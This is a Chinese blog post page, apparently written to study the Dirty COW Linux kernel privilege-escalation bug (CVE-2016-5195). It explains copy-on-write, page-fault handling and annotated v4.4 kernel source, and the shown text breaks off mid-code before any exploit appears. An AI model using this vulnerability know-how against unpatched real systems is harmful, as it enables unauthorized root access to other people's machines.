

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/avatar.png">
  <link rel="icon" href="/img/avatar.png">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
    <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="arttnba3">
  <meta name="keywords" content="">
  
    <meta name="description" content="快给你的🐂洗洗澡吧~">
<meta property="og:type" content="article">
<meta property="og:title" content="【CVE.0x00】CVE-2016-5195 “脏牛”漏洞复现及简要分析">
<meta property="og:url" content="http://blog.arttnba3.cn/2021/04/08/CVE-0X00-CVE-2016-5195/index.html">
<meta property="og:site_name" content="arttnba3&#39;s blog">
<meta property="og:description" content="快给你的🐂洗洗澡吧~">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://i.loli.net/2021/05/18/adXIHS51fMApqFj.png">
<meta property="article:published_time" content="2021-04-08T15:36:27.000Z">
<meta property="article:modified_time" content="2022-06-07T20:31:16.000Z">
<meta property="article:author" content="arttnba3">
<meta property="article:tag" content="Pwn">
<meta property="article:tag" content="CVE">
<meta property="article:tag" content="Linux">
<meta property="article:tag" content="提权">
<meta property="article:tag" content="Linux Kernel">
<meta property="article:tag" content="脏牛">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://i.loli.net/2021/05/18/adXIHS51fMApqFj.png">
  
  
    <meta name="referrer" content="no-referrer-when-downgrade">
  
  
  <title>【CVE.0x00】CVE-2016-5195 “脏牛”漏洞复现及简要分析 - arttnba3&#39;s blog</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- 主题依赖的图标库，不要自行修改 -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  




  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"blog.arttnba3.cn","root":"/","version":"1.9.2","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":"§"},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  


  
<meta name="generator" content="Hexo 6.2.0"><link rel="alternate" href="/atom.xml" title="arttnba3's blog" type="application/atom+xml">
</head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 80vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>arttnba3&#39;s blog</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                首页
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                归档
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/">
                <i class="iconfont icon-category-fill"></i>
                分类
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                标签
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/">
                <i class="iconfont icon-user-fill"></i>
                关于
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/links/">
                <i class="iconfont icon-link-fill"></i>
                友链
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/atom.xml">
                <i class="iconfont icon-rss"></i>
                rss
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('https://i.loli.net/2021/05/18/adXIHS51fMApqFj.png') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="【CVE.0x00】CVE-2016-5195 “脏牛”漏洞复现及简要分析"></span>
          
        </div>

        
          
  <div class="mt-3">
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2021-04-08 23:36" pubdate>
          2021年4月8日 晚上
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          undefined 字
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          NaN 分钟
        
      </span>
    

    
    
      
        <span id="busuanzi_container_page_pv" style="display: none">
          <i class="iconfont icon-eye" aria-hidden="true"></i>
          <span id="busuanzi_value_page_pv"></span> 次
        </span>
        
      
    
  </div>


        
      </div>

      
        <div class="scroll-down-bar">
          <i class="iconfont icon-arrowdown"></i>
        </div>
      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <!-- SEO header -->
            <h1 style="display: none">【CVE.0x00】CVE-2016-5195 “脏牛”漏洞复现及简要分析</h1>
            
              <p class="note note-info">
                
                  
                    本文最后更新于：2022年6月8日 凌晨
                  
                
              </p>
            
            
              <div class="markdown-body">
                
                <p>快给你的🐂洗洗澡吧~</p>
<span id="more"></span>

<h1 id="0x00-一切开始之前"><a href="#0x00-一切开始之前" class="headerlink" title="0x00.一切开始之前"></a>0x00.一切开始之前</h1><p><strong>CVE-2016-5195</strong> 即 <code>dirtyCOW</code> ，俗称「脏牛」漏洞，是 Linux Kernel 中的条件竞争漏洞，攻击者可以利用 Linux kernel 中的 COW（Copy-on-Write）技术中存在的逻辑漏洞完成对文件的越权读写</p>
<p>脏牛漏洞几乎涵盖了所有主流的 Linux 发行版，同时也是一个由Linus本人亲手修复的漏洞</p>
<blockquote>
<p>笔者本人尝试复现的第一个 kernel 方向的 cve ，不禁感叹自己会的还是太少…</p>
</blockquote>
<blockquote>
<p>本篇文章中贴出的内核源码主要关注笔者写上中文注释的部分即可</p>
</blockquote>
<h2 id="一、写时复制机制（Copy-on-Write）"><a href="#一、写时复制机制（Copy-on-Write）" class="headerlink" title="一、写时复制机制（Copy-on-Write）"></a>一、写时复制机制（Copy-on-Write）</h2><p>要想说清楚什么是 <code>dirtyCOW</code> ，首先得先把什么是 <code>COW</code> 给弄明白，这里我们先从教科书上讲的常规的 COW 入手</p>
<h3 id="basic-COW"><a href="#basic-COW" class="headerlink" title="basic COW"></a>basic COW</h3><p>COW 即 <code>Copy On Write</code>——<strong>「写时复制」</strong>：为了减少系统的开销，在一个进程通过 <code>fork()</code> 系统调用创建子进程时，并不会直接将整个父进程地址空间的所有内容都复制一份后再分配给子进程（虽然第一代 UNIX 系统的确采用了这种非常耗时的做法），而是基于一种更为高效的思想：</p>
<p><strong>「父进程与子进程共享所有的页框」而不是直接为子进程分配新的页框，「只有当任意一方尝试修改某个页框」的内容时内核才会为其分配一个新的页框，并将原页框中内容进行复制</strong></p>
<ul>
<li>在 <code>fork()</code> 系统调用之后，父子进程共享所有的页框，内核会将这些页框<strong>全部标为read-only</strong></li>
<li>由于所有页框被标为<strong>只读</strong>，当任意一方尝试修改某个页框时，便会触发<strong>「缺页异常」</strong>（page fault）——此时内核才会为其分配一个新的页框</li>
</ul>
<p>大致过程如下图所示：</p>
<p><img src="https://i.loli.net/2021/04/12/5mcfXUIkLKtx3Zb.png" srcset="/img/loading.gif" lazyload alt="87BE6D2465D0C5621CA7C96D4E23860A.png"></p>
<p><img src="https://i.loli.net/2021/04/12/imwksGXKjo2dlCA.png" srcset="/img/loading.gif" lazyload alt="9D5CF91BA873C5AEC5A4E6CDE75FF6C5.png"></p>
<p><img src="https://i.loli.net/2021/04/12/e7Y9HCJjIm4suAk.png" srcset="/img/loading.gif" lazyload alt="FD5A70A4D50C2B733ED19AB5E5B83B3B.png"></p>
<p>这便是「写时复制」的大体流程——只有当某个进程尝试修改共享内存时，内核才会为其分配新的页框，以此大幅度减少系统的开销，达到性能优化的效果</p>
<h3 id="mmap-与-COW"><a href="#mmap-与-COW" class="headerlink" title="mmap 与 COW"></a>mmap 与 COW</h3><p>同样地，若是我们使用 mmap 映射了一个只具有读权限而不具有写权限的文件，当我们尝试向 mmap 映射区域写入内容时，也会触发写时复制机制，将该文件内容拷贝一份到内存中，此时进程对这块区域的读写操作便不会影响到硬盘上的文件</p>
<h2 id="二、缺页异常（page-fault）"><a href="#二、缺页异常（page-fault）" class="headerlink" title="二、缺页异常（page fault）"></a>二、缺页异常（page fault）</h2><p>在 CPU 中使用 <strong>MMU</strong>（Memory Management Unit，内存管理单元）进行虚拟内存与物理内存间的映射，而在系统中<strong>并非所有的虚拟内存页都有着对应的物理内存页</strong>， 当软件试图访问已映射在虚拟地址空间中，但是<strong>并未被加载在物理内存</strong>中的一个分页时，MMU 无法完成由虚拟内存到物理内存间的转换，此时便会产生<strong>「缺页异常」</strong>（page fault）</p>
<p>可能出现缺页异常的情况如下：</p>
<ul>
<li>线性地址不在虚拟地址空间中</li>
<li>线性地址在虚拟地址空间中，但没有访问权限</li>
<li>线性地址在虚拟地址空间中，但没有与物理地址间建立映射关系</li>
</ul>
<p>虽然被命名为 “fault” ，但是缺页异常的发生并不一定代表出错</p>
<h3 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h3><h4 id="①软性缺页异常（soft-page-fault）"><a href="#①软性缺页异常（soft-page-fault）" class="headerlink" title="①软性缺页异常（soft page fault）"></a>①软性缺页异常（soft page fault）</h4><p>软性缺页异常意味着<strong>相关的页已经被载入内存中</strong>，但是并未向 MMU 进行注册，此时内核只需要在 MMU 中注册相关页对应的物理页即可</p>
<p>可能出现软性缺页异常的情况如下：</p>
<ul>
<li>两个进程间共享相同的物理页框，操作系统为其中一个装载并注册了相应的页，但是没有为另一个进程注册</li>
<li>该页已被从 CPU 的工作集（<strong>在某段时间间隔 ∆ 里，进程实际要访问的页面的集合</strong>，为提高性能，只有经常被使用的页才能驻留在工作集中，而长期不用的页则会被从工作集中移除）中移除，但是尚未被交换到磁盘上；若是程序重新需要使用该页内容，CPU 只需要向 MMU 重新注册该页即可</li>
</ul>
<h4 id="②硬性缺页异常（hard-page-fault）"><a href="#②硬性缺页异常（hard-page-fault）" class="headerlink" title="②硬性缺页异常（hard page fault）"></a>②硬性缺页异常（hard page fault）</h4><p>硬性缺页异常意味着<strong>相关的页未经被载入内存中</strong>，此时操作系统便需要<code>寻找到一个合适且空闲的物理页/将另一个使用中的页写到硬盘上</code>，随后向该物理页内写入相应内容，并在 MMU 中注册该页</p>
<p>硬性缺页异常的开销极大，因此部分操作系统也会采取延迟页载入的策略——只有到万不得已时才会分配新的物理页，这也是 Linux 内核的做法</p>
<p>若是频繁地发生硬性缺页异常则会引发<strong>系统颠簸</strong>（system thrashing，有的书上也叫系统抖动）——因资源耗尽而无法正常完成工作</p>
<h4 id="③无效缺页异常（invalid-page-fault）"><a href="#③无效缺页异常（invalid-page-fault）" class="headerlink" title="③无效缺页异常（invalid page fault）"></a>③无效缺页异常（invalid page fault）</h4><p>无效缺页异常意味着程序访问了一个无效的内存地址（内存地址不存在于进程地址空间），在 Linux 下内核会向进程发送 <code>SIGSEGV</code> 信号</p>
<h3 id="处理缺页异常"><a href="#处理缺页异常" class="headerlink" title="处理缺页异常"></a>处理缺页异常</h3><p>由于本篇所分析的漏洞存在于老版本的 Linux kernel，故我们简要分析相应版本内核（笔者选择了 v4.4）中该函数的逻辑</p>
<p>在接下来的分析过程中所涉及到的地址如无说明皆为【线性地址】</p>
<p>仅针对<strong>「文件映射缺页异常」</strong>而言，大致的流程如下图所示：（字比较丑见谅qwq</p>
<p><img src="https://i.loli.net/2021/04/12/KYlk3gy8tZnVXmP.png" srcset="/img/loading.gif" lazyload alt="4586A60AB93248CD8618EEFEC8260941.png"></p>
<h4 id="预处理：-do-page-fault"><a href="#预处理：-do-page-fault" class="headerlink" title="预处理：__do_page_fault()"></a>预处理：__do_page_fault()</h4><p>先来看处理缺页异常的顶层函数<code>__do_page_fault ()</code>，该函数位于内核源码中的 <code>arch/x86/mm/fault.c</code> 中，代码逻辑如下：</p>
<blockquote>
<p>注：找寻某个函数于内核源码中的位置可以使用<a target="_blank" rel="noopener" href="https://elixir.bootlin.com/">https://elixir.bootlin.com/</a></p>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> noinline <span class="type">void</span></span><br><span class="line">__do_page_fault(<span class="keyword">struct</span> pt_regs *regs, <span class="type">unsigned</span> <span class="type">long</span> error_code,</span><br><span class="line">		<span class="type">unsigned</span> <span class="type">long</span> address)<span class="comment">//regs：寄存器信息；error_code：异常代码（三bit）；address：请求的【线性地址】（虚拟地址转换到物理地址之间的中间量）</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">vm_area_struct</span> *<span class="title">vma</span>;</span><span class="comment">//线性区描述符，用以标识一块连续的地址空间，多个vma之间使用单向链表结构连接</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">tsk</span>;</span><span class="comment">//进程描述符，用以描述一个进程</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span> *<span class="title">mm</span>;</span><span class="comment">//内存描述符，用以描述一个进程的内存地址空间</span></span><br><span class="line">	<span class="type">int</span> fault, major = <span class="number">0</span>;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> flags = FAULT_FLAG_ALLOW_RETRY | FAULT_FLAG_KILLABLE;<span class="comment">//设置flag的允许重试 &amp;&amp; 允许杀死（进程？）标志位</span></span><br><span class="line"></span><br><span class="line">	tsk = current;</span><br><span class="line">	mm = tsk-&gt;mm;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Detect and handle instructions that would cause a page fault for</span></span><br><span class="line"><span class="comment">	 * both a tracked kernel page and a userspace page.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">if</span> (kmemcheck_active(regs))</span><br><span class="line">		kmemcheck_hide(regs);</span><br><span class="line">	prefetchw(&amp;mm-&gt;mmap_sem);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (unlikely(kmmio_fault(regs, address)))<span class="comment">//mmiotrace跟踪器相关</span></span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * We fault-in kernel-space virtual memory on-demand. The</span></span><br><span class="line"><span class="comment">	 * &#x27;reference&#x27; page table is init_mm.pgd.</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * NOTE! We MUST NOT take any locks for this case. We may</span></span><br><span class="line"><span class="comment">	 * be in an interrupt or a critical region, and should</span></span><br><span class="line"><span class="comment">	 * only copy the information from the master page table,</span></span><br><span class="line"><span class="comment">	 * nothing more.</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * This verifies that the fault happens in kernel space</span></span><br><span class="line"><span class="comment">	 * (error_code &amp; 4) == 0, and that the fault was not a</span></span><br><span class="line"><span class="comment">	 * protection error (error_code &amp; 9) == 0.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">if</span> (unlikely(fault_in_kernel_space(address))) &#123;<span class="comment">//发生缺页异常的地址位于内核空间，这里由于内核空间页面使用频繁，一般不会发生缺页异常，所以使用unlikely宏优化</span></span><br><span class="line">		<span class="keyword">if</span> (!(error_code &amp; (PF_RSVD | PF_USER | PF_PROT))) &#123;<span class="comment">//三个标志位：使用了页表项保留的标志位、用户空间页异常、页保护异常，三个标志位都无说明是由内核触发的内核空间的缺页异常</span></span><br><span class="line">			<span class="keyword">if</span> (vmalloc_fault(address) &gt;= <span class="number">0</span>)<span class="comment">//处理vmalloc异常</span></span><br><span class="line">				<span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> (kmemcheck_fault(regs, address, error_code))</span><br><span class="line">				<span class="keyword">return</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">/* Can handle a stale RO-&gt;RW TLB: */</span></span><br><span class="line">		<span class="keyword">if</span> (spurious_fault(error_code, address))<span class="comment">//检测是否是假的page fault（TLB的延迟flush造成）</span></span><br><span class="line">			<span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">		<span class="comment">/* kprobes don&#x27;t want to hook the spurious faults: */</span></span><br><span class="line">		<span class="keyword">if</span> (kprobes_fault(regs))<span class="comment">//转内核探针处理</span></span><br><span class="line">			<span class="keyword">return</span>;</span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * Don&#x27;t take the mm semaphore here. If we fixup a prefetch</span></span><br><span class="line"><span class="comment">		 * fault we could otherwise deadlock:</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		bad_area_nosemaphore(regs, error_code, address);<span class="comment">//前面的情况都不是，说明发生了对非法地址访问的内核异常（如用户态尝试访问内核空间）,杀死进程和内核的&quot;Oops&quot;</span></span><br><span class="line"></span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//接下来是对于发生在用户空间的缺页异常处理</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* kprobes don&#x27;t want to hook the spurious faults: */</span></span><br><span class="line">	<span class="keyword">if</span> (unlikely(kprobes_fault(regs)))<span class="comment">//转内核探针处理</span></span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (unlikely(error_code &amp; PF_RSVD))<span class="comment">//使用了页表项保留的标志位</span></span><br><span class="line">		pgtable_bad(regs, error_code, address);<span class="comment">//页表错误，处理</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (unlikely(smap_violation(error_code, regs))) &#123;<span class="comment">//触发smap保护（内核直接访问用户地址空间）</span></span><br><span class="line">		bad_area_nosemaphore(regs, error_code, address);<span class="comment">//杀死进程和内核的&quot;Oops&quot;</span></span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * If we&#x27;re in an interrupt, have no user context or are running</span></span><br><span class="line"><span class="comment">	 * in a region with pagefaults disabled then we must not take the fault</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">if</span> (unlikely(faulthandler_disabled() || !mm)) &#123;<span class="comment">//设置了不处理缺页异常 | 进程没有地址空间（？）</span></span><br><span class="line">		bad_area_nosemaphore(regs, error_code, address);<span class="comment">//杀死进程和内核的&quot;Oops&quot;</span></span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * It&#x27;s safe to allow irq&#x27;s after cr2 has been saved and the</span></span><br><span class="line"><span class="comment">	 * vmalloc fault has been handled.</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * User-mode registers count as a user access even for any</span></span><br><span class="line"><span class="comment">	 * potential system fault or CPU buglet:</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">if</span> (user_mode(regs)) &#123;<span class="comment">//发生缺页异常时的寄存器状态为用户态下的</span></span><br><span class="line">		local_irq_enable();<span class="comment">//本地中断请求(irq, interrupt request)开启</span></span><br><span class="line">		error_code |= PF_USER;<span class="comment">//设置错误代码的【用户空间页】标志位</span></span><br><span class="line">		flags |= FAULT_FLAG_USER;<span class="comment">//设置flag的【用户空间页】标志位</span></span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">if</span> (regs-&gt;flags &amp; X86_EFLAGS_IF)</span><br><span class="line">			local_irq_enable();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	perf_sw_event(PERF_COUNT_SW_PAGE_FAULTS, <span class="number">1</span>, regs, address);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (error_code &amp; PF_WRITE)<span class="comment">//写页异常，可能是页不存在/无权限写</span></span><br><span class="line">		flags |= FAULT_FLAG_WRITE;<span class="comment">//设置flag的【写页异常】标志位</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * When running in the kernel we expect faults to occur only to</span></span><br><span class="line"><span class="comment">	 * addresses in user space.  All other faults represent errors in</span></span><br><span class="line"><span class="comment">	 * the kernel and should generate an OOPS.  Unfortunately, in the</span></span><br><span class="line"><span class="comment">	 * case of an erroneous fault occurring in a code path which already</span></span><br><span class="line"><span class="comment">	 * holds mmap_sem we will deadlock attempting to validate the fault</span></span><br><span class="line"><span class="comment">	 * against the address space.  Luckily the kernel only validly</span></span><br><span class="line"><span class="comment">	 * references user space from well defined areas of code, which are</span></span><br><span class="line"><span class="comment">	 * listed in the exceptions table.</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * As the vast majority of faults will be valid we will only perform</span></span><br><span class="line"><span class="comment">	 * the source reference check when there is a possibility of a</span></span><br><span class="line"><span class="comment">	 * deadlock. Attempt to lock the address space, if we cannot we then</span></span><br><span class="line"><span class="comment">	 * validate the source. If this is invalid we can skip the address</span></span><br><span class="line"><span class="comment">	 * space check, thus avoiding the deadlock:</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">    <span 